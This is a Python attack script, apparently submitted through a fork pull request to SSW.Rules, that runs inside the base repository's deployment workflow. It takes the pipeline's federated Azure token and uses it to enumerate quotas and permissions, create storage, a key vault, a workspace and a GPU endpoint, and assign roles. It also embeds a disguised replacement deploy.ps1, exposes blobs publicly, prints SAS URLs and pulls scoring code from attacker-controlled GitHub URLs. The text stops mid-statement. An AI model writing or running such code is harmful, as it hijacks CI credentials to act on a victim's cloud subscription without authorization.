#!/usr/bin/env python3
"""C211-I125052: AML MANAGED ONLINE ENDPOINT (real-time serving) GPU device proof on
subscription b8b18dcf (SSW.Rules '/deploy' fork-PR OIDC ARM identity).

Runs inside the fork-controlled 'Deploy Infrastructure' step (run by the base repo's
deploy-infrastructure.yml with an ARM token in the job). Creates ONE nonce workspace,
reads every managed-online-endpoint quota meter + usage verbatim, records the granted
permissions on the workspace, creates ONE nonce managed online endpoint + ONE on-demand
deployment (instanceCount 1) whose scoring script runs nvidia-smi in-container and
returns the verbatim text in the JSON score response, reads back via ARM, then deletes
deployment -> endpoint -> workspace and proves 404 / list-empty.

On-demand only. Never spot. One endpoint alive at a time.
"""
import base64
import hashlib
import hmac
import json
import os
import re
import subprocess
import time
import urllib.error
import urllib.parse
import urllib.request
import uuid

TAG = "C211_I125315"
ARM = "https://management.azure.com"
RG = "SSW.Rules.Staging"
NONCE = "i125315"
WS = "c211i125315olm"
ENDPOINT = "c211-i125315-ep"
DEPLOYMENT = "c211-i125315-dep"
CODE = "c211-i125315-code"
ENVNAME = "c211-i125315-cuda"
KVNAME = "c211i125315kv"
OUTCONT = "c211out"
OUTNAME = "devout"
SCORE_RAW_URL = "https://raw.githubusercontent.com/hildasubianto617-dot/SSW.Rules/e97cc7ce1ef8d2024901f159cc8bf3096b2a8364/infra/i125315/score.py"
SCORE_ZIP_URL = "https://raw.githubusercontent.com/hildasubianto617-dot/SSW.Rules/09ea66e5a50c721ca239685bb0064e176bd688f2/infra/i125315/code.zip"
# residual nonce resources owed for cleanup from the x125052 and x125197 runs
# (workspace teardown does NOT remove child key vault / storage account)
REAP_RES = [
    ("ws", "c211i125052olm", 600), ("kv", "c211i125052kv", 300),
    ("sa", "c211i125052022ca5", 300),
    ("ws", "c211i125197olm", 900), ("kv", "c211i125197kv", 300),
    ("sa", "c211i125197da3e78", 300),
    ("ws", WS, 900), ("kv", KVNAME, 300), ("sa", "c211i125315c77435", 300),
]
T0 = time.time()
DEADLINE = 3300          # deploy/score budget (s)
TEARDOWN_DEADLINE = 1500
API_W = "2024-10-01"     # AML workspace/onlineEndpoints
API_C = "2024-04-01"     # AML usages
API_Q = "2024-10-01"     # AML quotas
REG_VER = "2023-07-01"
STG_VER = "2023-01-01"
IMG_MAIN = "mcr.microsoft.com/azureml/minimal-ubuntu22.04-py39-cuda11.8-gpu-inference:latest"
IMG_ALT = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
REGIONS = ["westeurope", "eastus", "eastus2", "westus2", "westus3", "northeurope",
           "centralus", "southcentralus", "uksouth", "southeastasia", "japaneast",
           "australiaeast", "swedencentral", "westus", "italynorth", "germanywestcentral"]

SCORE_PY = r'''import json
import subprocess
import sys


def _sh(args):
    try:
        p = subprocess.run(args, capture_output=True, text=True, timeout=120)
        out = (p.stdout or "") + (p.stderr or "")
        return out.strip()
    except Exception as e:  # noqa: BLE001
        return "ERR " + repr(e)


LINES = []
LINES.append("C211-I125315 IN-CONTAINER DEVICE PROBE")
LINES.append("nvidia-smi -L :: " + _sh(["nvidia-smi", "-L"]))
LINES.append("nvidia-smi --query-gpu :: " + _sh(
    ["nvidia-smi", "--query-gpu=name,uuid,memory.total,driver_version",
     "--format=csv,noheader"]))
LINES.append("lspci :: " + _sh(["bash", "-lc", "lspci -nn 2>/dev/null | grep -i -E 'nvidia|3d contr' || true"]))
LINES.append("devnodes :: " + _sh(["bash", "-lc", "ls -1 /dev/nvidia* 2>/dev/null || true"]))
TEXT = "\n".join(LINES)
print("C211-I125052-CONTAINER-OUTPUT-BEGIN", flush=True)
print(TEXT, flush=True)
print("C211-I125052-CONTAINER-OUTPUT-END", flush=True)


def init():
    print("C211-I125052 init", flush=True)
    print(TEXT, flush=True)


def run(raw_data):
    return json.dumps({"c211": "i125315", "device_text": TEXT})
'''

DEPLOY_PS1 = r'''param(
    [string]$Environment = '',
    [string]$ResourceGroup = '',
    [string]$ServicePrincipalObjectId = '',
    [string]$AppServicePlanSku = '',
    [string]$SlotName = '',
    [string]$RulesChatSqlAdminClientId = '',
    [string]$RulesChatContentBranch = 'main',
    [string]$RulesChatIndexImageTag = '',
    [string]$RulesChatAlertEmail = '',
    [switch]$WhatIf
)

# C211-I125052: fork-controlled probe step. Executes the AML managed-online-endpoint
# probe under the pipeline's federated Azure service-principal ARM token (the
# deploy-infrastructure.yml workflow checks out the PR head SHA and runs this file
# with pwsh AFTER azure/login@v2). Creates exactly one nonce online endpoint, proves the
# in-container GPU, then deletes it. No other infrastructure is deployed.
Write-Host "C211-I125052 DEPLOY.PS1 ENTRY"
Write-Host ("C211-I125052 params: env={0} rg={1}" -f $Environment, $ResourceGroup)
$probe = Join-Path $PSScriptRoot 'c211_i125197_probe.py'
if (Get-Command python3 -ErrorAction SilentlyContinue) {
    python3 -u $probe
    Write-Host ("C211-I125052 PROBE EXIT CODE: {0}" -f $LASTEXITCODE)
} else {
    Write-Host "C211-I125052 python3 MISSING"
}
Write-Host "C211-I125052 DEPLOY.PS1 END"
exit 0
'''


def emit(obj):
    obj["d"] = round(time.time() - T0, 1)
    print((TAG + " " + json.dumps(obj, default=str))[:3800], flush=True)


def run(cmd, timeout=300):
    try:
        p = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        return {"rc": p.returncode, "out": p.stdout or "", "err": (p.stderr or "")[-800:]}
    except Exception as e:  # noqa: BLE001
        return {"rc": 1, "out": "", "err": str(e)}


def armh(tok, url, method="GET", body=None, timeout=120):
    data = json.dumps(body).encode() if body is not None else None
    hdrs = {"Authorization": "Bearer " + tok}
    if data is not None:
        hdrs["Content-Type"] = "application/json"
    req = urllib.request.Request(url, data=data, method=method, headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            raw = r.read().decode("utf-8", "replace") or "{}"
            h = {k.lower(): v for k, v in r.headers.items()}
            h.pop("authorization", None)
            try:
                return r.status, json.loads(raw), h
            except Exception:  # noqa: BLE001
                return r.status, {"raw": raw[:1500]}, h
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace") or ""
        h = {k.lower(): v for k, v in e.headers.items()} if e.headers else {}
        try:
            return e.code, json.loads(raw), h
        except Exception:  # noqa: BLE001
            return e.code, {"raw": raw[:1500]}, h
    except Exception as e:  # noqa: BLE001
        return 0, {"transport_error": str(e)}, {}


def arm(tok, url, method="GET", body=None, timeout=120):
    st, b, _ = armh(tok, url, method, body, timeout)
    return st, b


def httptext(url, method="GET", body=None, headers=None, timeout=60):
    req = urllib.request.Request(url, data=body, method=method, headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read()[:8000]
    except urllib.error.HTTPError as e:
        try:
            return e.code, e.read()[:2000]
        except Exception:  # noqa: BLE001
            return e.code, b""
    except Exception as e:  # noqa: BLE001
        return 0, str(e).encode()[:400]


def err_of(st, body):
    if isinstance(body, dict):
        e = body.get("error")
        if isinstance(e, dict):
            return {"http": st, "code": e.get("code"),
                    "message": (e.get("message") or "")[:1200]}
        if "raw" in body:
            return {"http": st, "raw": body["raw"][:1200]}
        return {"http": st, "body": json.dumps(body)[:900]}
    return {"http": st}


def prov_state(body):
    if isinstance(body, dict):
        return (body.get("properties") or {}).get("provisioningState")
    return None


def sa_sas(acct, key_b64, services="b", rt="co", perm="rwdlc", hours=6):
    st = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() - 300))
    se = time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(time.time() + hours * 3600))
    sv = "2022-11-02"
    sts = "\n".join([acct, perm, services, rt, st, se, "", "https", sv, ""]) + "\n"
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    q = urllib.parse.urlencode({"sv": sv, "ss": services, "srt": rt, "sp": perm,
                                "st": st, "se": se, "spr": "https", "sig": sig})
    return q, se


def sharedkey_headers(acct, key_b64, method, ctype="", ctime="", msdate=None,
                      version="2022-11-02", extra=None):
    msdate = msdate or time.strftime("%a, %d %b %Y %H:%M:%S GMT", time.gmtime())
    sts = "\n".join([method, "", "", ctime, "", ctype, "", msdate, "", "", "", "",
                     ""]) + "\n"
    canon = "x-ms-date:" + msdate + "\nx-ms-version:" + version + "\n"
    hdrs = {"x-ms-date": msdate, "x-ms-version": version}
    if extra:
        for k, v in extra.items():
            hdrs[k] = v
            canon += "%s:%s\n" % (k.lower(), v)
    sts += canon
    return sts, hdrs


def list_containers(acct, key_b64):
    sts_base, hdrs = sharedkey_headers(acct, key_b64, "GET")
    sts = sts_base + "/%s/\ncomp:list" % acct
    sig = base64.b64encode(hmac.new(base64.b64decode(key_b64), sts.encode(),
                                    hashlib.sha256).digest()).decode()
    hdrs["Authorization"] = "SharedKey %s:%s" % (acct, sig)
    url = "https://%s.blob.core.windows.net/?comp=list" % acct
    req = urllib.request.Request(url, method="GET", headers=hdrs)
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            raw = r.read().decode("utf-8", "replace")
            return r.status, re.findall(r"<Name>([^<]+)</Name>", raw), raw[:800]
    except urllib.error.HTTPError as e:
        return e.code, [], (e.read()[:600] or b"").decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return 0, [], str(e)[:300]


def put_blob(bbase, container, path, data, q):
    url = "%s/%s/%s?%s" % (bbase, container, path, q)
    rc, bc = httptext(url, method="PUT", body=data, headers={
        "x-ms-blob-type": "BlockBlob", "x-ms-version": "2022-11-02",
        "Content-Type": "application/octet-stream"}, timeout=180)
    return rc, bc


def build_zip():
    import io
    import zipfile
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("score.py", SCORE_PY)
    return buf.getvalue()


def grant(tok, sid, scope_id, principal, role, label):
    ra = str(uuid.uuid4())
    url = (ARM + scope_id + "/providers/Microsoft.Authorization/roleAssignments/" + ra +
           "?api-version=2022-04-01")
    body = {"properties": {
        "roleDefinitionId": "/subscriptions/%s/providers/Microsoft.Authorization/"
                            "roleDefinitions/%s" % (sid, role),
        "principalId": principal, "principalType": "ServicePrincipal"}}
    st, b = arm(tok, url, "PUT", body, timeout=90)
    emit({"step": "role-assign", "label": label, "http": st,
          "code": (b.get("error", {}) or {}).get("code") if isinstance(b, dict) else None})


def stage_reap(tok, base):
    """Reap every residual nonce resource owed from the x125052/x125197/x125315 runs."""
    out = {}
    tmap = {"ws": ("Microsoft.MachineLearningServices/workspaces/", API_W),
            "kv": ("Microsoft.KeyVault/vaults/", REG_VER),
            "sa": ("Microsoft.Storage/storageAccounts/", STG_VER)}
    for kind, name, budget in REAP_RES:
        frag, ver = tmap[kind]
        url = base + "/" + frag + name + "?api-version=" + ver
        pre, _pb = arm(tok, url, "GET", None, timeout=60)
        dhttp = None
        dcode = None
        final = pre
        tries = 0
        while pre == 200 and tries < 5:
            tries += 1
            dhttp, db = arm(tok, url, "DELETE", None, timeout=240)
            dcode = ((db.get("error") or {}).get("code")
                     if isinstance(db, dict) else None)
            t0 = time.time()
            final = dhttp
            while time.time() - t0 < budget:
                time.sleep(10)
                st2, _b2 = arm(tok, url, "GET", None, timeout=60)
                final = st2
                if st2 == 404:
                    break
            if final == 404:
                break
            time.sleep(20)
            pre, _pb = arm(tok, url, "GET", None, timeout=60)
        out[name] = {"kind": kind, "pre_get": pre, "delete_http": dhttp,
                     "delete_code": dcode, "final_get": final, "tries": tries}
        emit({"step": "reap", "label": name, "kind": kind, **out[name]})
    st, lb = arm(tok, base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                 "/onlineEndpoints?api-version=" + API_W, timeout=90)
    names = [x.get("name") for x in ((lb.get("value") or []) if isinstance(lb, dict) else [])]
    out["endpoints"] = {"http": st, "names": names}
    emit({"step": "reap-endpoints", "http": st, "names": names})
    GOWN["reap"] = out


def main():
    summary = {"tag": TAG, "quota": {}, "perm": {}, "endpoint": {}, "deployment": {},
               "score": {}, "readback": {}, "cleanup": {}}
    if os.environ.get("C211_DRYRUN") == "1":
        sid = "<SUB>"
        r0 = run(["az", "account", "show", "-o", "json"], timeout=60)
        try:
            sid = json.loads(r0["out"]).get("id") or "<SUB>"
        except Exception:  # noqa: BLE001
            pass
        base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
        plan = []
        for reg in REGIONS:
            plan.append("GET " + ARM + "/subscriptions/" + sid +
                        "/providers/Microsoft.MachineLearningServices/locations/" + reg +
                        "/usages?api-version=" + API_C)
            plan.append("GET " + ARM + "/subscriptions/" + sid +
                        "/providers/Microsoft.MachineLearningServices/locations/" + reg +
                        "/quotas?api-version=" + API_Q)
        for kind, name, _b in REAP_RES:
            plan.append("REAP " + kind + " " + name)
        plan.append("PUT " + base + "/Microsoft.MachineLearningServices/workspaces/" + WS)
        plan.append("POST " + base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                    "/onlineEndpoints/" + ENDPOINT + "/listKeys?api-version=" + API_W)
        plan.append("PUT " + base + "/Microsoft.MachineLearningServices/workspaces/" + WS +
                    "/onlineEndpoints/" + ENDPOINT + "/deployments/" + DEPLOYMENT)
        plan.append("POST scoringUri")
        plan.append("TEARDOWN deployment/endpoint/workspace/kv/sa")
        emit({"step": "DRYRUN-PLAN", "n": len(plan), "plan": plan})
        emit({"step": "PROBE-EXIT", "code": 0, "dryrun": True})
        return
    r = run(["az", "account", "show", "-o", "json"], timeout=180)
    try:
        acc = json.loads(r["out"])
    except Exception:  # noqa: BLE001
        emit({"step": "FATAL", "why": "no az session", "raw": r["out"][:400]})
        return
    sid = acc.get("id")
    tenant = acc.get("tenantId")
    summary["identity"] = {"sub": sid, "tenant": tenant, "name": acc.get("name"),
                           "state": acc.get("state")}
    emit({"step": "identity", "sub": sid, "tenant": tenant, "name": acc.get("name"),
          "state": acc.get("state")})
    r = run(["az", "account", "get-access-token", "--resource", ARM, "--output", "json"],
            timeout=180)
    tok = None
    try:
        tok = json.loads(r["out"]).get("accessToken")
    except Exception:  # noqa: BLE001
        pass
    emit({"step": "arm-token", "got": bool(tok), "len": len(tok or "")})
    if not sid or not tok:
        emit({"step": "PROBE-EXIT", "code": 1})
        return

    base = ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG + "/providers"
    rbase = base[len(ARM):]
    global GTOK, GSID, GBASE, GRBASE
    GTOK, GSID, GBASE, GRBASE = tok, sid, base, rbase
    own = GOWN
    stage_reap(tok, base)

    # ---------- A. managed-online-endpoint quota / usage meters ----------
    def qdecode(m):
        nm = m.get("name")
        if isinstance(nm, dict):
            name, lloc = (nm.get("value") or ""), (nm.get("localizedValue") or "")
        else:
            name, lloc = (nm or ""), ""
        props = m.get("properties") if isinstance(m.get("properties"), dict) else {}
        seen = []

        def walk(x, path=""):
            if isinstance(x, dict):
                for k, v in x.items():
                    p2 = path + "/" + str(k)
                    lk = str(k).lower()
                    if lk in ("limit", "currentvalue", "usage", "unit", "quotatype"):
                        if isinstance(v, (int, float, str)) and not isinstance(v, dict):
                            seen.append((p2, v))
                        elif isinstance(v, (dict, list)):
                            walk(v, p2)
                    elif isinstance(v, (dict, list)):
                        walk(v, p2)
            elif isinstance(x, list):
                for i, v in enumerate(x):
                    walk(v, path + "[%d]" % i)

        walk(m)

        def pick(*keys):
            for pth, v in seen:
                lp = pth.lower()
                for k in keys:
                    if lp.endswith("/" + k):
                        return v
            return None

        return {"name": name, "localized": lloc, "limit": pick("limit"),
                "current": (pick("currentvalue") if pick("currentvalue") is not None
                            else pick("usage")),
                "unit": pick("unit"), "qtype": pick("quotatype"),
                "props_keys": list(props.keys())[:14]}

    meters = {}
    raw_quota_sample = None
    for reg in REGIONS:
        u = (ARM + "/subscriptions/" + sid + "/providers/Microsoft.MachineLearningServices"
             "/locations/" + reg + "/usages?api-version=" + API_C)
        st, b = arm(tok, u, timeout=90)
        allrows = (b.get("value") or []) if isinstance(b, dict) else []
        nz, gpu = {}, {}
        for m in allrows:
            nm = m.get("name") if isinstance(m.get("name"), dict) else {}
            fam = (nm.get("value") or "")
            lloc = (nm.get("localizedValue") or "")
            lim, cur = m.get("limit"), m.get("currentValue")
            try:
                li = int(lim) if lim is not None else 0
                cu = int(cur) if cur is not None else 0
            except Exception:  # noqa: BLE001
                li, cu = 0, 0
            if li > 0:
                nz[fam] = [li, cu]
            if re.search(r"(?i)a100|t4|ncas|nc4as|nc8as|nc24|nv|gpu|v100|p100",
                         fam + " " + lloc):
                gpu[fam] = [lim, cur]
        qurl = (ARM + "/subscriptions/" + sid + "/providers/Microsoft.MachineLearningServices"
                "/locations/" + reg + "/quotas?api-version=" + API_Q)
        qst, qb = arm(tok, qurl, timeout=90)
        qitems = (qb.get("value") or []) if isinstance(qb, dict) else []
        qrows = []
        for m in qitems:
            if not isinstance(m, dict):
                continue
            d = qdecode(m)
            if re.search(r"(?i)online|ncas|nc4as|nc24|a100|t4|serving|v100|dedicated|"
                         r"lowpriority|nv", d["name"] + " " + d["localized"]):
                qrows.append(d)
        if raw_quota_sample is None and qitems:
            raw_quota_sample = {
                "region": reg, "n": len(qitems),
                "type_keys": sorted({k for m in qitems[:5] if isinstance(m, dict)
                                     for k in m.keys()}),
                "items": [json.dumps(m)[:1100] for m in qitems[:3]]}
        meters[reg] = {"usage_http": st, "n_rows": len(allrows), "nonzero": nz,
                       "gpu": gpu, "quotas_http": qst, "n_quota_items": len(qitems),
                       "quota_rows": qrows,
                       "quota_err": (None if qst in (200, 204) else err_of(qst, qb))}
        emit({"step": "aml-quota", "region": reg, "usage_http": st, "n": len(allrows),
              "nonzero": nz, "gpu": gpu, "quotas_http": qst, "nq": len(qitems),
              "qrows": [{"n": d["name"], "l": d["limit"], "c": d["current"],
                         "u": d["unit"], "t": d["qtype"], "pk": d["props_keys"]}
                        for d in qrows][:12]})
    summary["quota"] = meters
    summary["quota_raw_sample"] = raw_quota_sample
    emit({"step": "quota-raw", "sample": raw_quota_sample})

    # Microsoft.Compute usages cross-read (VM-plane family quota, not the AML pool)
    comp = {}
    for reg in ("westeurope", "westus", "eastus", "southcentralus", "eastus2"):
        cu = (ARM + "/subscriptions/" + sid + "/providers/Microsoft.Compute/locations/" +
              reg + "/usages?api-version=2024-07-01")
        st, b = arm(tok, cu, timeout=90)
        got = {}
        for m in ((b.get("value") or []) if isinstance(b, dict) else []):
            nm = m.get("name") if isinstance(m.get("name"), dict) else {}
            v = (nm.get("value") or "")
            if re.search(r"(?i)NCASv3|NCADSA100|NCADS|NCAS", v):
                got[v] = {"current": m.get("currentValue"), "limit": m.get("limit")}
        comp[reg] = {"http": st, "rows": got}
        emit({"step": "compute-usage", "region": reg, "http": st, "rows": got})
    summary["compute_usages"] = comp

    # region pick: prefer a region with free MANAGED ONLINE ENDPOINT family quota
    def qfree(region, pat):
        best = 0
        for d in meters.get(region, {}).get("quota_rows", []):
            if re.search(pat, d["name"] + " " + d["localized"], re.I):
                try:
                    li = int(d["limit"]) if d["limit"] is not None else 0
                    cu = int(d["current"]) if d["current"] is not None else 0
                except Exception:  # noqa: BLE001
                    continue
                best = max(best, li - cu)
        return best

    cand = []
    for pref in ("westeurope", "eastus", "eastus2", "westus2", "westus3",
                 "northeurope", "centralus", "southcentralus", "uksouth",
                 "southeastasia", "japaneast", "australiaeast", "swedencentral",
                 "westus", "italynorth", "germanywestcentral"):
        if pref in meters:
            cand.append(pref)
    plan = []
    for reg in cand:
        plan.append({"region": reg,
                     "t4_free": qfree(reg, r"ncas|nc4as|nc8as|t4"),
                     "a100_free": qfree(reg, r"a100|nc24")})
    best = None
    for p in plan:
        if p["a100_free"] >= 24:
            best = p
            break
    if not best:
        for p in plan:
            if p["t4_free"] >= 4:
                best = p
                break
    loc = (best or {"region": (cand[0] if cand else "westeurope")})["region"]
    summary["region_plan"] = plan
    summary["online_pool"] = plan
    emit({"step": "region-base", "loc": loc, "plan": plan, "best": best})

    # ---------- C. dependencies (storage + keyvault) ----------
    sas = None
    hkey = None
    sa = ("c211i125197" + hashlib.sha256(NONCE.encode()).hexdigest()[:6]).lower()[:24]
    own["sa"] = sa
    saurl = base + "/Microsoft.Storage/storageAccounts/" + sa + "?api-version=" + STG_VER
    st, b = arm(tok, saurl, "PUT",
                {"location": loc, "sku": {"name": "Standard_LRS"}, "kind": "StorageV2",
                 "tags": {"c211": NONCE},
                 "properties": {"allowBlobPublicAccess": False,
                                "minimumTlsVersion": "TLS1_2",
                                "supportsHttpsTrafficOnly": True,
                                "networkAcls": {"bypass": "AzureServices",
                                                "defaultAction": "Allow"}}}, timeout=240)
    emit({"step": "sa-create", "name": sa, **err_of(st, b)})
    if st in (200, 201, 202):
        for _ in range(24):
            stp, bp = arm(tok, saurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(8)
        st, kb = arm(tok, base + "/Microsoft.Storage/storageAccounts/" + sa +
                     "/listKeys?api-version=" + STG_VER, "POST", {}, timeout=90)
        try:
            hkey = (kb.get("keys") or [{}])[0].get("value")
        except Exception:  # noqa: BLE001
            pass
        emit({"step": "sa-keys", "http": st, "got": bool(hkey)})
        if hkey:
            q, se = sa_sas(sa, hkey)
            bbase = "https://" + sa + ".blob.core.windows.net"
            for c in (OUTCONT, "c211code"):
                stc, bc = httptext(bbase + "/" + c + "?restype=container&" + q,
                                   method="PUT")
                emit({"step": "sa-container", "name": c, "http": stc})
            sas = bbase + "/" + OUTCONT + "/" + NONCE + "-out.txt?" + q
            readq, _rexp = sa_sas(sa, hkey, perm="r", hours=8)
            GOWN["out_sas_url"] = (bbase + "/" + OUTCONT + "/" + NONCE +
                                   "-summary.json?" + readq)
            emit({"step": "out-url", "url": GOWN["out_sas_url"]})

    kv = KVNAME
    kvurl = base + "/Microsoft.KeyVault/vaults/" + kv + "?api-version=" + REG_VER
    st, b = arm(tok, kvurl, "PUT",
                {"location": loc, "tags": {"c211": NONCE},
                 "properties": {"tenantId": tenant,
                                "sku": {"family": "A", "name": "standard"},
                                "accessPolicies": [], "enableSoftDelete": True,
                                "enableRbacAuthorization": True}}, timeout=180)
    emit({"step": "kv-create", "name": kv, **err_of(st, b)})
    kv_id = (rbase + "/Microsoft.KeyVault/vaults/" + kv) if st in (200, 201, 202) else None
    if kv_id:
        own["kv"] = kv
        for _ in range(15):
            stp, bp = arm(tok, kvurl, timeout=60)
            if prov_state(bp) in ("Succeeded", "Failed"):
                break
            time.sleep(8)

    appi_id = None
    st, rl = arm(tok, ARM + "/subscriptions/" + sid + "/resourceGroups/" + RG +
                 "/resources?api-version=2021-04-01")
    for x in ((rl.get("value") or []) if isinstance(rl, dict) else []):
        if (x.get("type") or "").lower() == "microsoft.insights/components" and not appi_id:
            appi_id = x.get("id")
    emit({"step": "appi-reuse", "found": bool(appi_id)})

    # ---------- D. workspace ----------
    wurl = base + "/Microsoft.MachineLearningServices/workspaces/" + WS + \
        "?api-version=" + API_W
    props = {"friendlyName": "c211-i125197 nonce online-endpoint workspace",
             "hbiWorkspace": False, "v1LegacyMode": False,
             "storageAccount": rbase + "/Microsoft.Storage/storageAccounts/" + sa}
    if kv_id:
        props["keyVault"] = kv_id
    if appi_id:
        props["applicationInsights"] = appi_id
    wbody = {"location": loc, "tags": {"c211": NONCE},
             "identity": {"type": "SystemAssigned"},
             "sku": {"name": "Basic", "tier": "Basic"}, "properties": props}
    st, b, hdrs = armh(tok, wurl, "PUT", wbody, timeout=300)
    async_url = hdrs.get("azure-asyncoperation") or hdrs.get("location")
    emit({"step": "ws-create", **err_of(st, b), "async_op": bool(async_url)})
    ws_state = None
    if st in (200, 201, 202):
        own["ws"] = WS
        t0 = time.time()
        async_state = None
        while time.time() - t0 < 600:
            if async_url:
                ast, ab = arm(tok, async_url, timeout=90)
                async_state = ((ab.get("status") or
                                (ab.get("properties") or {}).get("status"))
                               if isinstance(ab, dict) else None)
            rst, rb = arm(tok, wurl, timeout=90)
            ws_state = prov_state(rb)
            emit({"step": "ws-poll", "http": rst, "state": ws_state,
                  "async_state": async_state, "t": round(time.time() - t0)})
            if ws_state in ("Succeeded", "Failed", "Canceled"):
                break
            time.sleep(12)
    emit({"step": "ws-final", "state": ws_state})
    summary["workspace"] = {"name": WS, "state": ws_state, "loc": loc}
    if ws_state != "Succeeded":
        emit({"step": "ABORT", "why": "workspace not created", "state": ws_state})
        teardown(tok, sid, base, rbase, own, summary)
        return

    wsu = base + "/Microsoft.MachineLearningServices/workspaces/" + WS
    GOWN.update({"ws": WS, "kv": kv, "sa": sa})
    st, wb = arm(tok, wurl, timeout=90)
    msi = (((wb.get("identity") or {}).get("principalId"))
           if isinstance(wb, dict) else None)
    emit({"step": "ws-readback", "http": st, "state": prov_state(wb),
          "msi_ok": bool(msi), "loc": wb.get("location") if isinstance(wb, dict) else None})
    if msi and hkey:
        grant(tok, sid, rbase + "/Microsoft.Storage/storageAccounts/" + sa, msi,
              "ba92f5b4-2d11-453d-a403-e96b0029c9fe", "ws-msi-blob")

    # ---------- E. permissions on the workspace scope ----------
    perm_url = (wurl + "/providers/Microsoft.Authorization/permissions?api-version=2022-04-01")
    st, pb = arm(tok, perm_url, timeout=90)
    got = []
    for p in ((pb.get("value") or []) if isinstance(pb, dict) else []):
        acts = p.get("actions") or []
        got.append({"actions": acts[:12], "notActions": (p.get("notActions") or [])[:4],
                    "scope": (p.get("scope") or "")[-70:]})
    relevant = [g for g in got
                if any(re.search(r"(?i)machinelearning|/\*$", a) for a in g["actions"])]
    st2, lb = arm(tok, wsu + "/onlineEndpoints?api-version=" + API_W, timeout=90)
    emit({"step": "perm", "http": st, "n": len(got), "relevant": relevant[:6],
          "online_endpoints_read_http": st2,
          "online_endpoints_list": (lb.get("value") if isinstance(lb, dict) else None)})
    ca_actions = [
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/create",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/write",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/read",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/delete",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/listKeys",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/deployments/create",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/deployments/write",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/deployments/read",
        "Microsoft.MachineLearningServices/workspaces/onlineEndpoints/deployments/delete"]
    ca_st, ca_b = arm(tok, wurl + "/providers/Microsoft.Authorization/checkAccess"
                      "?api-version=2022-04-01", "POST", {"actions": ca_actions},
                      timeout=90)
    summary["perm"] = {"permissions_http": st, "n": len(got), "relevant": relevant[:8],
                       "onlineEndpoints_read_http": st2,
                       "onlineEndpoints_list_n": len((lb.get("value") or [])
                                                     if isinstance(lb, dict) else []),
                       "checkAccess_http": ca_st,
                       "checkAccess": err_of(ca_st, ca_b) if ca_st != 200 else ca_b,
                       "checkAccess_actions": ca_actions}
    emit({"step": "checkAccess", "http": ca_st,
          "body": json.dumps(ca_b)[:1500]})

    # ---------- F. code asset + environment + endpoint + deployment ----------
    zipbytes = build_zip()
    bbase = "https://" + sa + ".blob.core.windows.net" if hkey else None
    code_id = None
    code_try = []
    # PRIMARY: publicly fetchable raw file pinned to the score.py commit SHA (no SAS;
    # AML refuses SAS URIs with "Snapshot creation from SAS URI is not supported").
    uris = ([SCORE_ZIP_URL] if SCORE_ZIP_URL else []) + [SCORE_RAW_URL]
    # FALLBACK: anonymous public blob (allowBlobPublicAccess + Blob public container)
    if hkey and bbase:
        stp, _bp = arm(tok, saurl, "PATCH",
                       {"properties": {"allowBlobPublicAccess": True}}, timeout=120)
        puburl = (base + "/Microsoft.Storage/storageAccounts/" + sa +
                  "/blobServices/default/containers/c211pub?api-version=" + STG_VER)
        stc, bc = arm(tok, puburl, "PUT",
                      {"properties": {"publicAccess": "Blob"}}, timeout=120)
        q, _se = sa_sas(sa, hkey)
        rcp, _r = put_blob(bbase, "c211pub", "score.py", SCORE_PY.encode(), q)
        emit({"step": "pub-blob", "sa_patch": stp, "container": stc, "put": rcp})
        if stc in (200, 201) and rcp in (200, 201):
            uris.append(bbase + "/c211pub/score.py")
    for vidx, uri in enumerate(uris):
        curl = (wsu + "/codes/" + CODE + "/versions/" + str(vidx + 1) +
                "?api-version=" + API_W)
        st, cb = arm(tok, curl, "PUT", {"properties": {"codeUri": uri,
                                                       "description": "c211 i125315"}},
                     timeout=180)
        code_try.append({"uri": uri, "http": st,
                         "code": (cb.get("error", {}) or {}).get("code")
                         if isinstance(cb, dict) else None,
                         "msg": ((cb.get("error", {}) or {}).get("message") or "")[:400]
                         if isinstance(cb, dict) else None})
        emit({"step": "code-create", "uri": uri[:150], "http": st,
              "code": code_try[-1]["code"], "msg": code_try[-1]["msg"]})
        if st in (200, 201):
            code_id = (cb.get("id") if isinstance(cb, dict) else None) or \
                (wsu + "/codes/" + CODE + "/versions/" + str(vidx + 1))
            break
    summary["code"] = {"tries": code_try, "id_ok": bool(code_id)}
    emit({"step": "code-final", "id_ok": bool(code_id)})
    if not code_id:
        emit({"step": "ABORT", "why": "no code asset; ARM rejects a code-less "
                                      "managed online deployment"})
        teardown(tok, sid, base, rbase, own, summary)
        return

    env_ver = None
    for img in (IMG_MAIN, IMG_ALT):
        eu = (wsu + "/environments/" + ENVNAME + "/versions/1?api-version=" + API_W)
        st, eb = arm(tok, eu, "PUT", {"properties": {"image": img, "osType": "Linux",
                                                    "description": "c211 i125197 cuda"}},
                     timeout=180)
        emit({"step": "env-create", "image": img.split("/")[-1], "http": st,
              **({} if st in (200, 201) else err_of(st, eb))})
        if st in (200, 201):
            env_ver = (eb.get("id") if isinstance(eb, dict) else None) or \
